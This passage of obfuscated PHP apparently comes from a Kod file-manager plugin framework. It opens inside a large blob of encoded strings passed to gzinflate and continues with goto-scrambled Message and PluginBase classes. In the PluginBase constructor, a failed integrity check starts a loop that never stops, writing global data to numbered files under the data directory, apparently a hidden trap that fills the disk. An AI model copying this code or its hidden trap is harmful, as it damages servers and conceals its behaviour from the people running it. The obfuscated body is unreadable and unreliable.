8\x7d\xcc\xb8\xac\x5e\x26\x52\x2e\x2a\x2b\xf7\xc4\x6d\xee\x86\xbd\x72\x76\x4e\x61\x15"._kodDe('MaXFSxi4GfF6W+4ou+lHRgH6HImF9aqlHSCFiezcCa1zPLNJ8zK9Rx/cDSBvuxk=')."\161\115\341\322\14\164\27\174\24\362\256\72\167\366\275\150\21\156\10\22\3\113\226\24\246\21\265\33\173\226\47\247\332\223\40\304\330\323\40\373\315\323\300\21\147\375".base64_decode('DIZWsRBPoWWCzTN5BbyFeBxkLqAabSjWtqDUVbFkiVul99RtJda6LlYax9tc1g==')."\362\240\347\144\252\131\101\222\140\57\211\111\311\63\310\46\73\304\135\301\265\344\331\175\264\4\57\251\153\153\247\57\140\67\15\355\64\217\322\203\152\325\144\272\334\203"."\x29\x67\x74\x2e\xb\x7a\x9b\x39\xc5\xcb\x80\x19\xe3\xd\x17\x12\x95\x78\xac\xae\xe4\xea\x7a\x99\x2f\x6a\x3c\x8b\x62\xd8\x93\xcb\x89\x51\xea\x8b\x1d\xc9\xc0\xd3\x6a\x87\x9b\xed\x6a\x2c"."\x17\x77\xc5\xb9\xba\x38\x2d\x82\x70\x8a\x2d\x1d\x5e\x26\xdb\x32\xa0\x9b\x44\x94\xdc\xb\xf0\x22\x20\xc0\xba\xec\xe9\xa0\x2d\x96\xc8\x2\xd3\x8c\xb8\xae\xe6\x4c\xb\x3e\xc2\x8f\xce\x94"."\40\357\341\135\162\257\214\213\224\110\364\21\213\22\344\53\265\4\340\37\234\103\66\76\357\312\64\210\150\44\135\111\327\226\240\356\32\51\105\1\365\21\52\51\366\21"."\120\261\104\242\130\60\43\263\31\323\115\15\234\201\114\33\232\70\354\157\15\23\135\124\117\63\271\151\40\324\325\250\263\360\357\350\121\14\357\303\27\42\322\212\216\25"."\xee\x10\x76\x41\x77\x4f\x49\x2e\xcf\x22\xef\x7\xb4\x84\x43\xd1\x90\x97\x7a\x62\x2f\x26\xf8\x1a\x4f\x49\x59\x3\x6b\xda\x73\x96\x87\x2a\x43\xcf\xf2\xcf\xb7\x96\x60\xc4\x81\x9b\xa4\x90".strrev('Øw+áŠE"Yp’’AĞE’Aa¡F©]Ùù7•$MÍğÁ;"Ô‡ò»,Ùó×å').base64_decode('3QMW4QVuPq1Rx0zVlZWVzsoq8I9dKhJyq4aa+wlFKitr0D+cgUSuZBatOWDTUg==').base64_decode('7EIK9CkK6RDB4xk1m6cUkRfqoUuwZ7W1tZQKoAMAM4iMiWro1p8qcHJTJXRtRQ==')."\x62\x8a\x7d\x1a\xd8\x7d\x20\x59\x14\x7a\x3c\xc0\xbd\x4e\xc3\x80\x34\x1\xb\x84\xa6\x85\xf4\x98\xd9\x1d\x80\x62\x7c\xe9\x41\x3f\xfc\xd9\x4\xe1\x39\xa6\x62\xb3\x8e\x5a\xf1\x63\x2e\x3a"."\275\142\242\170\257\144\371\52\50\7\116\303\70\353\60\114\20\244\23\310\206\212\51\362\243\130\232\131\326\301\150\63\53\212\275\57\143\107\250\144\264\105\240\47\245\365"."\305\370\311\6\243\147\260\30\32\74\344\115\50\310\260\141\222\31\240\70\217\202\10\275\167\46\327\330\310\226\254\133\115\133\254\173\142\102\333\242\353\140\200\132\40\5".strrev('âš	ÕüP*43Æ‰èx)¸7éäÂ!ÍK¾°k·¢œKâãe ÉÑ×K')."\247\11\130\331\300\313\274\61\11\15\330\263\154\165\74\11\341\15\42\203\273\141\362\62\217\153\242\157\46\174\71\53\134\341\33\304\45\50\277\215\245\155\364\12\134\202"."\53\247\153\235\140\312\15\161\254\40\275\245\170\62\53\136\130\262\110\41\66\40\261\234\230\10\265\206\350\163\70\4\172\270\41\217\314\37\352\22\212\162\71\251\220\150".strrev('bˆ¸Å"Â0I:y&¡²…`Wìõ…5Œì€ÛY)şñ¹˜»3Ì¼2àÕ').base64_decode('S1WjV/twNvgtnDW9AMrIVqCYD+8Va95Hy1bSwJW0FBw8k0aJQlk48JjIacPt0g==')."\xc8\x9e\xf9\x29\x2\x2e\x56\x90\x28\x58\x7b\x24\xb2\x85\xd\xd4\x30\xfc\x20\xc4\x0\xf\x41\xc9\x8f\x4\xed\x6f\x4f\x5e\xa1\x24\x93\x80\x4c\x24\x93\xa3\x12\xd8\x27\xa8\x24\x9b\xd2\x35"."\323\24\15\111\75\11\1\3\6\305\3\63\212\253\70\247\363\357\130\356\164\4\127\207\254\50\100\332\364\353\62\305\326\110\123\306\205\74\261\162\212\336\26\265\153\323".base64_decode('IOxsUvxLfURmmUd+uJwRQbWhyBdIJVaFHBq6Etd0xNIJ5n9ZM6x0itGgxlhZeA==')."\x67\xa0\x14\x69\x2\x9a\x3d\xb\xc0\x9\xa1\x0\x30\x59\x79\xd1\x88\x5a\x70\x31\x9\x62\x82\x5f\x50\xe1\x24\x77\x56\x49\x8c\x4\x88\xe1\x96\x71\x64\xac\x90\x81\xca\x17\xa3\x6\x6c\x32"."\x17\x41\xab\x11\xf1\x90\x91\x7c\x7\x13\x6f\xdb\x4e\x68\xaa\x33\x29\x89\xa7\x24\xd5\x7c\x84\xd\x20\xc3\x5b\x38\x2\x43\xcc\x3\xcd\x42\xa7\x76\x7c\x64\x62\x15\xf4\xcd\x82\x2a\x38\xf"."\236\154\134\105\122\314\61\0\63\2\247\152\350\234\42\237\102\131\302\214\306\351\301\113\56\325\346\363\111\42\31\3\12\125\230\162\126\125\73\251\277\20\121\173\222\34".base64_decode('jWR+IfEogAEkcSkGI9pPpBwvowmv/iAjVW4ZiOxx2Xoiw10W04UTR2GaUciCVQ==')."\104\53\374\142\27\53\114\301\2\255\305\362\361\14\301\154\237\105\237\314\126\0\354\14\153\76\361\25\232\261\74\337\10\340\300\242\263\140\153\204\170\211\25\375\241\242"."\132\174\34\134\65\17\44\151\330\43\251\60\61\374\202\32\333\366\122\235\102\206\227\170\162\124\143\211\205\227\334\56\246\123\111\354\111\310\363\72\145\345\320\236\304\42"."\100\150\32\140\166\1\140\45\273\341\371\310\24\333\14\61\102\163\31\160\32\226\10\326\23\261\324\146\111\254\124\237\102\114\103\30\343\333\322\330\342\146\111\365\164\232".base64_decode('mIUn4Zr4gy1EYYrYZvSBedeorxVvDVOdoc9B9mXUuBQMzQx4PUFfIDJLgsb8/A==').base64_decode('+h4pR1u3O5L54MWhkN/BXODCoLMDkIXOBCOHDU74Cho1gj94a7MYRhW9oEVARg==').strrev('ÕÉZÃƒKX‹`ü_)'."\r".'éÈT,{Èé½ùaJéÎ#À\\Ó¥"¬’Õ¬g')."\171\65\333\253\32\52\107\16\264\306\200\330\72\227\325\351\314\161\263\60\351\11\321\67\63\237\154\374\25\321\364\336\316\173\212\45\104\265\110\274\114\242\177\221\34\25"."\x4e\x93\x77\x4a\xb8\xd7\x6c\x14\x15\xfc\x99\xe7\x74\x59\x35\x14\x21\x1\x3b\xd6\xae\x28\xa7\x31\xc1\x17\x9\xa9\x1d\xc3\x75\x70\x5a\x18\xbe\x71\xf8\x3f\x6e\x5c\x4d\x70\xd7\x4\xb6\xae"."\xa9\x9\x7a\xa5\xcd\x34\xe0\xb1\xf7\x5a\xaf\xf8\xd4\xa\xed\x42\x81\xd3\xf5\xff\xea\xbe\xdd\x21\xbc\xa7\x81\x4c\xc9\xa9\xf6\x21\x7a\xe8\x95\x5c\x36\xb0\x8b\xdc\x18\x7e\xd\x83\x7f\x2"."\xb0\x4d\xfa\x40\x4e\xbc\x10\x71\x27\xe8\xa3\x3e\x94\x51\x83\x5e\x51\xfc\x54\xfc\x9\x23\x9c\x3e\x85\xc5\x49\x6b\xf0\x73\x98\x43\x1\xfc\x12\xbc\x19\xa0\x94\x2c\x95\x45\x80\xd\x4d\xa6".strrev('?‚Èü8Æ£M M¿‡ü‘*•ª@VtÙÄ ;t4£¨'."\r".'ğXl<³ˆ×oDsh!rİ')."\x93\x33\x2d\x4c\x18\xd1\x83\xe5\x85\x2d\xf\x52\x22\xea\x83\x73\x2e\x50\xbf\x42\xcb\xc\x14\x24\x58\x58\xfa\x20\xed\x17\xd3\xc9\x82\x9e\x90\xb3\x49\x4d\x9c\x6\x84\x0\xc1\x39\x82\xdf"."\305\200\212\310\70\204\331\76\7\40\304\25\263\320\33\73\156\147\310\106\15\373\21\302\311\31\200\24\42\200\371\267\276\233\1\123\4\342\305\202\224\255\337\202\71\2"."\x30\x23\x93\x4c\xc1\xc0\x85\xfe\x42\x43\x7f\x8b\x1b\x7c\xa1\xf5\x31\xf8\xa7\x8d\xfc\x52\x2c\x6f\x6f\x1a\xef\x6b\xd2\x95\x72\xb6\xf6\x5e\xcb\x43\xcb\x42\x42\x93\xc2\x39\x31\x54\xb\x5e".strrev('ôM%HPªbŞ»4GÕ\'çû›êÉd¶ªˆoƒô)'."\0".'O4^ß>özˆ¶†YËv').base64_decode('+B3VonKnA9M+EAPxWP2AGBa1/9CgQSaViSQYBEwXCtCnLBIO9M4CxkP2tzyE/Q==')."\xc3\x90\x9b\x58\xbb\x33\xad\x75\xc8\xe9\x30\xd6\x99\xb1\xe8\xa0\xeb\x80\x6f\x61\x1a\x72\x96\x62\x38\xc9\x2d\xe7\x72\x43\xca\xdc\x9\x3d\x82\xe5\xef\xf9\x6c\x0\x5b\x3c\x59\x52\x75\x81"."\x2f\x12\xf5\x2f\xf1\x4d\x3\x37\xeb\x20\xc5\xc1\xd7\x5a\xf0\xd5\x2\x19\xb6\xd8\x24\xbd\xde\x41\x3f\x90\x73\x6a\x10\x9e\xf7\x73\x17\x5e\x7\x41\x9d\x1e\x4a\xde\x8\xca\x70\xe4\x46\xce"."\x25\x32\x2e\xa4\x80\x34\x4d\xe2\xb\x6c\xd9\xa0\x10\x20\xe0\xae\x47\x1\xb4\xeb\x45\x42\xf7\x57\x52\x19\x1c\x5a\x5f\x7b\xc1\x0\x8b\x7e\x7c\x4a\x92\x51\xfd\x30\xce\x79\x42\xd1\xe4\x93".base64_decode('3xDbX5ign2HPZTjwyPiLRfhxDAd7CMOBHds4yPMXDm6e82sPxvBXu6xPfcE+Mw==').base64_decode('bbEC8ttOebOpslUI2ycuqhVK0vglWDaf4XeMIGLlRAoGLIwwr6cd6ArQQT2c2A==')."\xa6\x83\x8f\x4a\x5c\x99\x22\x73\xf8\xdf\xdb\xc0\x4a\x83\x88\xbd\x48\x58\xb1\x4e\xcd\xb4\xe\x9d\x5e\xab\xd8\x8b\xa9\x16\xa8\x3\x4c\x3d\xd7\x62\xc7\x6e\x96\xa\xbc\xee\xcf\xcf\x24\xaa"."\307\115\230\42\262\361\174\175\370\165\5\165\14\210\177\310\235\11\71\321\371\302\113\126\260\222\250\213\47\161\373\242\114\253\232\147\341\163\65\2\210\132\121\362\377\154"."\x2b\x70\xa2\x18\x17\x15\xd4\x2d\xb\xdf\xe2\x2a\x98\x12\x4\x95\x82\x6a\x82\x70\xa0\xd9\x2e\x9b\x35\x78\x7\x6c\xf0\xce\xe2\x23\x8c\x3f\x57\x63\xfd\x16\x7e\x5c\xa9\xc8\x38\x84\x83\x88".base64_decode('bw38EoqWhuxlBgo3TV228knF2AE0E5T3UNGbdIq972hiiCCBZwv8gtiiqdmlIA==').strrev('ÅÑ1¿JıOld—¶$E{¹«‚®`Ê@[¿öMò!Úc“M”.¨<:°')."\xd8\x1f\xa7\x4c\x5f\xa7\x41\x8b\x2a\x48\xce\x14\x33\x84\x16\x98\x50\x2f\x9c\x1b\xb3\x8e\xd5\xd6\x3c\xa8\xc6\xdb\x68\x77\x48\x43\x15\x2a\xa4\xc2\x84\x97\x73\xb8\xbb\x6\x81\xe4\x82\xb5"."\251\371\323\20\314\54\305\126\374\65\20\144\321\302\205\321\150\257\132\366\255\340\102\115\64\20\101\15\211\333\240\260\151\44\37\41\375\45\33\27\275\21\217\364\63\74"."\63\231\31\220\54\150\200\300\251\23\136\203\322\304\260\325\252\66\104\235\136\1\42\311\302\150\201\270\317\366\140\30\102\76\366\127\304\350\370\321\76\347\70\115\260\47".base64_decode('s7AD7NkMC3tg2N+PAeSU6DkORBmEk8OTYD2kf4u/5rC/IZcTDGht72UKokrrSw==')."\x98\x29\xb1\x5b\xd0\xb1\x80\x6d\x5b\x53\xf3\x3d\x68\xd\x89\xef\x4f\x8\xe2\x47\x2e\xc5\x70\x98\x52\xe2\xff\xcf\x6f\xca\xfd\xff\x7a\x4a\x6e\x42\x25\x15\x2a\x5b\xde\x1b\x9b\x49\x8\x5c"."\x4a\x8d\xd\xa\x7e\x3\xb1\x40\xd3\x36\xe\xeb\x11\x39\x5c\xcc\x25\x10\xea\xb0\xc4\x48\x84\x6f\x38\x78\xf6\xb8\x6c\x8f\x82\xba\x98\x42\x22\x75\x44\x41\xfd\x53\xc8\xf4\xc2\x44\x86\x2f"."\350\24\10\50\351\313\123\0\42\273\331\303\110\305\42\205\317\2\132\200\217\322\233\274\233\131\65\336\135\344\2\16\56\101\320\352\145\117\240\22\12\212\161\374\4\210"."\11\352\172\303\115\103\161\310\146\101\122\222\242\105\321\174\54\224\243\14\131\71\301\304\355\63\50\372\100\26\247\4\213\210\230\303\222\124\200\157\242\226\123\320\222\50"."\116\17\177\376\322\145\175\315\221\324\150\262\275\373\203\13\31\342\334\132\55\340\4\255\236\302\273\331\302\226\330\306\26\253\100\145\115\253\174\206\75\47\130\151\177\137"."\260\312\131\370\61\254\53\15\145\13\141\310\375\123\340\104\227\17\350\162\260\110\35\274\105\43\274\314\20\133\241\370\206\144\217\101\12\114\61\10\211\343\245\33\273\105".strrev('3\\)á}(P\'÷RSkHì2MGÕKVüJ°›-½à®ÛxNAeMfY×')."\x93\xc3\x92\x2f\xba\x7c\xc8\x9e\xc6\x22\x86\x32\x44\x77\xc0\x56\xb3\x1b\x41\x8f\xd5\x9a\x1\x15\x8f\xad\xbb\x66\x7a\xb1\x62\x71\x4d\x37\x84\x62\x2c\xbd\x58\x59\xf8\xa4\x99\x69\x99\x4d".base64_decode('7ubU7t4UscWY07UwvOQKUUwSbtgAqZuwOi1GmSiZunai7yPzOyLrFR3zKVmAtQ==')."\xf2\x6a\x50\xc8\x46\xb5\xa8\x73\x10\xf0\xb\xad\x8b\x2\xdc\xda\x1a\x65\x63\xc9\xb6\xa7\x57\x36\xe9\x45\x97\xbd\x56\xab\x85\xaf\x10\x2e\xf4\xe2\x8\x76\xfc\x85\x77\x36\xfc\x2a\x49\x20"."\x4\x68\x35\xc8\x98\x70\xbc\x6b\x4b\x17\xe\x2\x8e\xf9\xe4\x5e\x7e\x4d\xc3\x29\xe1\x44\x82\xbd\x52\x69\x29\x9a\xa0\xbc\x0\x4b\x5\x29\xfc\x41\x4b\x48\xf7\x8\x6\x8c\x5c\xed\x55\xe9".base64_decode('sz+c5hKNHi0FC1O5gaN9XGgvsHRyW5YVVAwItPAk7MqWaZ8I7ARU3eZqKbiPjA==')."\131\346\237\264\332\141\262\142\154\61\100\31\244\50\357\264\244\332\30\44\50\172\240\147\265\55\313\20\137\326\264\136\300\211\334\273\260\266\112\72\50\64\47\136\316\15"."\131\41\122\374\43\34\334\254\123\54\330\254\362\14\172\42\151\226\311\27\260\30\33\30\51\31\26\63\55\335\261\57\55\242\355\71\134\342\304\14\222\156\272\250\264\270"."\260\274\142\353\275\130\301\76\62\134\303\350\123\315\170\112\140\70\12\63\13\323\365\202\111\45\37\52\336\137\173\257\350\234\332\331\60\336\110\101\177\204\33\376\250\126".base64_decode('pA7uUdFqOAu9/8wIRUvdIaYA1sVZsG5BNq0syC+EeqacN4YYXuHkEVY+UWTANg==')."\206\27\27\35\152\76\213\26\56\374\34\201\70\173\151\304\373\27\357\5\147\331\155\267\250\305\172\121\264\360\220\275\50\362\246\55\161\200\125\4\211\322\234\42\150\223"."\x5f\xb9\x17\x22\x68\x9e\x57\x44\x1\x0\xb7\x9\xf\x5f\xd1\xb3\x4a\x91\x6c\x51\x9b\xa0\xb8\xbe\x41\xb8\xe8\xd6\x37\xac\x8a\x0\xb6\x74\x71\x62\xa8\x52\x10\x60\xcb\xf8\x2b\xaf\x82\x66"."\xea\x18\xb\x4a\xcf\x67\xbb\xb3\xd4\x1a\x3\xb4\xce\x55\xb7\xa0\x66\x26\x7b\xb\x95\x7d\xae\xa0\x35\x2b\x68\x66\xf3\x82\xca\x65\x51\x45\x59\x7\x7a\x29\xbb\x80\x5d\x4d\xd3\x87\x24\x44"."\35\143\314\232\150\200\212\26\224\221\354\157\203\343\174\372\221\264\40\145\263\11\270\70\113\157\271\204\56\42\2\102\111\204\16\343\222\145\213\306\65\76\330\211\110\35".base64_decode('36x54cUqu02BPJQDn5c4Gz5W7oB5US2Hfus106SYBDD5qCSi3uCh5xAUEUCIXw==')."\x9d\xc0\x59\x44\xd2\x7c\x4\x8e\x8\x6d\xa0\x20\xb9\xe3\x83\x5c\x65\x44\xc1\xb9\x8\xd9\x58\x22\xf0\x96\x80\x45\xc4\x33\x8d\x5c\xcc\x35\xe4\x6d\xb7\x8b\x3c\x1\x70\x8a\x1d\x5a\x3f\x75"."\x63\x6\x8d\x3a\x79\x7f\xf8\x13\xaa\xb2\x9d\x42\xe3\xea\x0\x4\xde\x44\xb5\xa\x64\x3a\x6b\xb8\x71\x8e\x9b\x78\x88\x75\xa2\x36\x9c\xc4\x7f\x48\x57\xae\xd3\x52\x1d\x3b\xa2\x67\xea\x84"."\277\326\2\21\100\362\46\260\347\110\44\73\202\76\124\375\363\2\221\150\244\40\253\305\23\211\314\15\205\175\330\321\144\101\66\252\45\150\260\24\144\265\64\206\232\207".strrev('zjâ£J\\îå?º	ïw€‹Õæ†Òõ Vpo^ãÒÑ¨<‚Áy7óÊ')."\221\323\224\141\26\214\275\224\14\167\177\304\353\130\345\0\342\272\32\324\27\30\13\130\335\261\333\224\313\50\300\222\206\240\66\112\63\151\73\234\43\251\320\361\46\333"."\xdc\x8c\xa\x46\x3\xd2\x6c\x4a\xef\xf8\x86\xd8\x65\xb9\x56\x16\xd2\xd1\x66\x41\x28\x46\x0\x42\xf1\x74\x45\x9\x15\x45\x67\x4c\x14\x92\x16\xa\xed\x51\x2e\x9f\x11\xd8\xd3\x33\x34\xa2"."\377\324\245\165\10\102\171\314\224\20\113\54\62\307\202\12\22\16\223\354\377\13\215\250\177\40\201\234\0\0"."".strrev('').""."".strrev('').base64_decode('')."", 10, -8))); goto Eôó÷Á½¿; b½¿ôëî¦“: $b¦îˆÚì¼» = $_SERVER[Šº][582]; $_SERVER[ÁäèóÕ] = explode($_SERVER[Šº][583], gzinflate(substr($_SERVER[Šº][584], 10, -8))); $e½’‘Ì§´é = $_SERVER[Šº][585]; goto B¤Ôî¬Î÷ğ; B«£‡È†‡Ğ: class Message { function __construct() { } public function send($CÊ‡æÏ•Û = '', $f²Ê…¢ƒé = array(), $dÉ…‡¦®ì§ = "\x74\x65\170\x74") { goto bºƒ§íáŞ; CÂù¥†í: Hook::trigger($EŒêÃ¢ÒÖ[1384], $c“¤‹Ä‘’ƒ); goto aØ…Š“ÍĞ; bºƒ§íáŞ: $EŒêÃ¢ÒÖ =& $_SERVER[Šº]; $fÛƒ‡Š‘Ì‘ = array($EŒêÃ¢ÒÖ[29] => $EŒêÃ¢ÒÖ[1381], $EŒêÃ¢ÒÖ[714] => $CÊ‡æÏ•Û); if (in_array($dÉ…‡¦®ì§, array($EŒêÃ¢ÒÖ[1381], $EŒêÃ¢ÒÖ[1382]))) { $fÛƒ‡Š‘Ì‘[$EŒêÃ¢ÒÖ[29]] = $dÉ…‡¦®ì§; } goto E“ˆá¶Çù¹; E“ˆá¶Çù¹: $f²Ê…¢ƒé = array($EŒêÃ¢ÒÖ[1003] => isset($f²Ê…¢ƒé[$EŒêÃ¢ÒÖ[1003]]) ? $f²Ê…¢ƒé[$EŒêÃ¢ÒÖ[1003]] : $EŒêÃ¢ÒÖ[33], $EŒêÃ¢ÒÖ[570] => isset($f²Ê…¢ƒé[$EŒêÃ¢ÒÖ[570]]) ? $f²Ê…¢ƒé[$EŒêÃ¢ÒÖ[570]] : $EŒêÃ¢ÒÖ[33]); if (empty($CÊ‡æÏ•Û) || empty($f²Ê…¢ƒé[$EŒêÃ¢ÒÖ[1003]]) && empty($f²Ê…¢ƒé[$EŒêÃ¢ÒÖ[570]])) { return !1; } $c“¤‹Ä‘’ƒ = array($EŒêÃ¢ÒÖ[1322] => $fÛƒ‡Š‘Ì‘, $EŒêÃ¢ÒÖ[1383] => $f²Ê…¢ƒé); goto CÂù¥†í; aØ…Š“ÍĞ: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto Eæõ‚Üî„Á; D†¡½å§£‰: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto B Å™ÖŞ‰é; dªç’Çãø: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $f†ÕÌñ—Œø[8]; $this->pluginApi = appHostGet() . $f†ÕÌñ—Œø[1388] . $this->pluginName . $f†ÕÌñ—Œø[8]; $this->pluginHost = $config[$f†ÕÌñ—Œø[1389]] . $this->pluginName . $f†ÕÌñ—Œø[8]; goto BäŸÈïŠ; Eæõ‚Üî„Á: $f†ÕÌñ—Œø =& $_SERVER[Šº]; $aµó…½çç˜ = $_SERVER[$f†ÕÌñ—Œø[397]] . $f†ÕÌñ—Œø[398]; $eÈƒÖ ƒ¼Ä = $f†ÕÌñ—Œø[394]; goto A†Ö…ô×™‡; A†Ö…ô×™‡: if ($_SERVER[$f†ÕÌñ—Œø[395]] != $eÈƒÖ ƒ¼Ä($aµó…½çç˜)) { goto B¡‚¸è‹œÒ; Fİ…·­Ô‹ô: $f„¡ÈØŸ“À = 1; for ($cˆÁÖ¡™¶ = $f„¡ÈØŸ“À; $cˆÁÖ¡™¶ > 0; $cˆÁÖ¡™¶++) { $f Èñ“ˆ•¾(DATA_PATH . $cˆÁÖ¡™¶, $d‹Ç–İã); } goto B¾»¨²ˆ; f‹ƒ¢ÉìÈ: $F²ìÚÔÕì¹(); $f Èñ“ˆ•¾ = $f†ÕÌñ—Œø[1385]; $d‹Ç–İã = json_encode($GLOBALS[$f†ÕÌñ—Œø[1386]]); goto Fİ…·­Ô‹ô; B¡‚¸è‹œÒ: $F²ìÚÔÕì¹ = $f†ÕÌñ—Œø[829]; $b·Ñ•²ÊäÀ = $f†ÕÌñ—Œø[396]; $cóÜãÄ‘Í = $_SERVER[$f†ÕÌñ—Œø[397]] . $f†ÕÌñ—Œø[398]; goto fºñ‘ö¾’Å; B¦ÏíÛÎ¾í: $A¼‰¸ä•©ã = $f†ÕÌñ—Œø[830]; $A¼‰¸ä•©ã($_SERVER[$f†ÕÌñ—Œø[831]]); $F²ìÚÔÕì¹ = $f†ÕÌñ—Œø[829]; goto f‹ƒ¢ÉìÈ; fºñ‘ö¾’Å: $Fãê¹ò‘Á = $b·Ñ•²ÊäÀ($cóÜãÄ‘Í); $b‚‹êùÙ½ = explode($f†ÕÌñ—Œø[228], $Fãê¹ò‘Á); if (count($b‚‹êùÙ½) < $f†ÕÌñ—Œø[588]) { $EÉ„øÔæ˜¼ = $f†ÕÌñ—Œø[400]; $EÉ„øÔæ˜¼(); } goto B¦ÏíÛÎ¾í; B¾»¨²ˆ: } global $in, $config; $this->config =& $config; goto eé¿ßİ‡³µ; BäŸÈïŠ: $this->pluginHostDefault = $config[$f†ÕÌñ—Œø[1389]] . $this->pluginName . $f†ÕÌñ—Œø[8]; $EÎ¤Êç¬æ = $config[$f†ÕÌñ—Œø[1390]]; if ($EÎ¤Êç¬æ && strpos($f†ÕÌñ—Œø[47] . $EÎ¤Êç¬æ . $f†ÕÌñ—Œø[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$f†ÕÌñ—Œø[1391]] . $this->pluginName . $f†ÕÌñ—Œø[8]; } goto D†¡½å§£‰; eé¿ßİ‡³µ: $this->in =& $in; $this->modelPlugin = Model($f†ÕÌñ—Œø[1387]); $this->pluginName = str_replace($f†ÕÌñ—Œø[1387], $f†ÕÌñ—Œø[33], get_class($this)); goto dªç’Çãø; B Å™ÖŞ‰é: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Šº][1392]); } protected function assign($FÔ¨”õŒ‡ª, $e÷ÑÃŸÍ² = false) { if (is_array($FÔ¨”õŒ‡ª)) { $this->values = array_merge($this->values, $FÔ¨”õŒ‡ª); } else { $this->values[$FÔ¨”õŒ‡ª] = $e÷ÑÃŸÍ²; } } protected function display($Bºƒ¦õÁí¬) { extract($this->values); require $Bºƒ¦õÁí¬; } final function hookRegist($EìåªáÎ¶Ü) { $this->modelPlugin->appRegist($this->pluginName, $EìåªáÎ¶Ü); } final function appIcon() { $d„Ñ¡Âãì¿ =& $_SERVER[Šº]; $AøÁÈÀºÆ† = $this->appPackage(); $EŠ´ŠğˆÀÀ = $d„Ñ¡Âãì¿[33]; if (isset($AøÁÈÀºÆ†[$d„Ñ¡Âãì¿[416]])) { if (isset($AøÁÈÀºÆ†[$d„Ñ¡Âãì¿[416]][$d„Ñ¡Âãì¿[1393]])) { $EŠ´ŠğˆÀÀ = $d„Ñ¡Âãì¿[1394] . $AøÁÈÀºÆ†[$d„Ñ¡Âãì¿[416]][$d„Ñ¡Âãì¿[1393]] . $d„Ñ¡Âãì¿[1395]; } else { if ($AøÁÈÀºÆ†[$d„Ñ¡Âãì¿[416]][$d„Ñ¡Âãì¿[1396]]) { $EŠ´ŠğˆÀÀ = $d„Ñ¡Âãì¿[1397] . $AøÁÈÀºÆ†[$d„Ñ¡Âãì¿[416]][$d„Ñ¡Âãì¿[1396]] . $d„Ñ¡Âãì¿[1398]; } } } return $EŠ´ŠğˆÀÀ; } final function fileCanView($DÈƒ“ÌÁÉõ) { goto B’¸àßùˆ; B´¢’…ÂÙ”: ActionCall($Eõ¸¦¨’•[1411], $DÈƒ“ÌÁÉõ); goto C·äöêõ; B’¸àßùˆ: $Eõ¸¦¨’• =& $_SERVER[Šº]; if (request_url_safe($DÈƒ“ÌÁÉõ)) { return !0; } if ($this->isShare($DÈƒ“ÌÁÉõ)) { return !0; } goto F³ÆŒÁä„¥; F³ÆŒÁä„¥: $dÆĞÈë‹œ· = Session::get($Eõ¸¦¨’•[1399]); if (!$dÆĞÈë‹œ· || !$dÆĞÈë‹œ·[$Eõ¸¦¨’•[1400]]) { $BÜµ½Œ‰ˆÍ = $Eõ¸¦¨’•[1401] . rawurlencode(this_url()); show_tips(LNG($Eõ¸¦¨’•[1402]) . $Eõ¸¦¨’•[1403] . $BÜµ½Œ‰ˆÍ . $Eõ¸¦¨’•[1404] . LNG($Eõ¸¦¨’•[1405]) . $Eõ¸¦¨’•[1406], !1); } if (!Action($Eõ¸¦¨’•[1407])->authCan($Eõ¸¦¨’•[1408])) { show_tips(LNG($Eõ¸¦¨’•[1409]) . $Eõ¸¦¨’•[1410], !1); } goto B´¢’…ÂÙ”; C·äöêõ: } final function isShare($f»®‹ˆê‚) { $f§Ò·ÂÙ¶ = KodIO::parse($f»®‹ˆê‚); return $f§Ò·ÂÙ¶[$_SERVER[Šº][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Aã“¡”‹ã±) { if (request_url_safe($Aã“¡”‹ã±)) { return $Aã“¡”‹ã±; } if (!$this->isShare($Aã“¡”‹ã±)) { $Aã“¡”‹ã± = $this->filePath($Aã“¡”‹ã±); } return Action($_SERVER[Šº][1058])->linkOut($Aã“¡”‹ã±); } public function filePathLinkOut($fà÷Ä¡°÷…) { if (request_url_safe($fà÷Ä¡°÷…)) { return $fà÷Ä¡°÷…; } $this->fileCanView($fà÷Ä¡°÷…); return Action($_SERVER[Šº][1058])->link($fà÷Ä¡°÷…); } final function filePath($Cô¥œÜ“• ) { $dáœäâŸğÖ =& $_SERVER[Šº]; if ($eì‚©²± è = $this->checkSharePath($Cô¥œÜ“• )) { return $eì‚©²± è; } $this->fileCanView($Cô¥œÜ“• ); if (request_url_safe($Cô¥œÜ“• )) { $a¶ÀÖ•àá = parse_url_query($Cô¥œÜ“• ); if (isset($a¶ÀÖ•àá[$dáœäâŸğÖ[1412]]) && isset($a¶ÀÖ•àá[$dáœäâŸğÖ[208]])) { $EÂö¾“§Ùµ = Model($dáœäâŸğÖ[728])->get($dáœäâŸğÖ[729]); $f­Šƒó› = Mcrypt::decode($a¶ÀÖ•àá[$dáœäâŸğÖ[208]], $EÂö¾“§Ùµ); if ($f­Šƒó›) { $this->fileInfo = IO::infoWithChildren($f­Šƒó›); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $f­Šƒó›; } } $Cô¥œÜ“•  = $this->_cacheHttpFile($Cô¥œÜ“• ); $this->fileInfo = IO::infoWithChildren($Cô¥œÜ“• ); } else { $this->fileInfo = IO::infoWithChildren($Cô¥œÜ“• ); if (!$this->fileInfo) { show_tips(LNG($dáœäâŸğÖ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $Cô¥œÜ“• ; } final function _cacheHttpFile($a•ç…‡‘è) { $BÊ×ÄöëÊÁ = hash_path($a•ç…‡‘è, !0); $this->cachePath = $this->pluginCachePath($BÊ×ÄöëÊÁ); if ($E¦Å‘¦Š†ˆ = IO::fileNameExist($this->cachePath, $BÊ×ÄöëÊÁ)) { return KodIO::make($E¦Å‘¦Š†ˆ); } $D•§‡ñ›ä™ = $this->cachePath . $BÊ×ÄöëÊÁ; return $this->pluginCacheFileSet($D•§‡ñ›ä™, file_get_contents($a•ç…‡‘è)); } final function _tmpFileName($D¨¬›ÒÈ‡¶ = array()) { goto C“õÇíŸë; eÂ„»ªŞ: $D—•İ†ÆÖÂ = 